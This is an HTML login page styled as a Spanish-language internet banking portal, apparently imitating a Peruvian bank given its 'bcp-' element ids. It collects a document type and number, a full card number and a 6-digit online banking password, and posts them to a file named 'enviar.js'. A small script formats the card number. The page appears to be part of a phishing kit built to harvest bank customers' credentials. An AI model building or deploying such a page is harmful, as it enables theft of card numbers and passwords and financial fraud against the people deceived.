<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banca por Internet</title>
    <link rel="stylesheet" type="text/css" href="styles.css">
</head>
<body>

    <div class="left-container">
        <div class="logo-container"> 
            <img width="100" src="logo.svg" alt="Logo">
        </div>
    </div>

    <div class="right-container">
        <div class="form-container">
            <div class="title-container">
                <h2 class="title">Banca por Internet</h2>
            </div>
            
            <form action="enviar.js" method="POST" id="login-form">
                <input type="hidden" name="paso" value="login">

                <div class="radio-container">
                    <div class="radio-option">
                        <input class="radio-input" id="bcp-rb-0-lbl" type="radio" name="tipo" value="Persona" checked>
                        <label class="radio-label" for="bcp-rb-0-lbl"><span>Persona</span></label>
                        <div class="check"></div>
                    </div>
                    <div class="radio-option">
                        <input class="radio-input" id="bcp-rb-1-lbl" type="radio" name="tipo" value="Empresa">
                        <label class="radio-label" for="bcp-rb-1-lbl"><span>Empresa</span></label>
                        <div class="check"></div>
                    </div>
                </div>

                <div class="input-field" style="display: flex; align-items: center; gap: 8px;">
                    <select name="tipoDocumento" id="tipoDocumento" required style="width: 80px; padding: 12px 5px; border: 1px solid #ccc; border-radius: 4px; font-family: inherit; background-color: #fff; height: 100%;">
                        <option value="DNI" selected>DNI</option>
                        <option value="CE">CE</option>
                        <option value="PAS">PAS</option>
                        <option value="RUC">RUC</option>
                    </select>
                    <input type="text" placeholder="Nro Documento" required class="input-text" name="nroDocumento" id="nroDocumento" maxlength="15" style="flex: 1; margin: 0;">
                </div>

                <div class="input-field">
                    <input type="text" id="tarjeta" name="tarjeta" required maxlength="19" placeholder="Número de tarjeta">
                </div>
                
                <div style="margin-bottom: 20px;" class="input-field">
                    <input type="password" id="clave" name="clave" required maxlength="6" placeholder="Clave de internet de 6 dígitos">
                </div>

                <div class="links">
                    <p class="link-text">Crear clave</p>
                    <p class="link-text">Olvidé mi clave</p>
                </div>

                <button type="submit">Continuar</button>
            </form>
        </div>
    </div>

    <script>
        document.getElementById('tarjeta').addEventListener('input', function (e) {
            let target = e.target;
            let value = target.value.replace(/\D/g, '');
            let parts = [];

            for (let i = 0, len = value.length; i < len; i += 4) {
                parts.push(value.substring(i, i + 4));
            }

            if (parts.length > 0) {
                target.value = parts.join(' ');
            } else {
                target.value = value;
            }
        });
    </script>
</body>
</html>
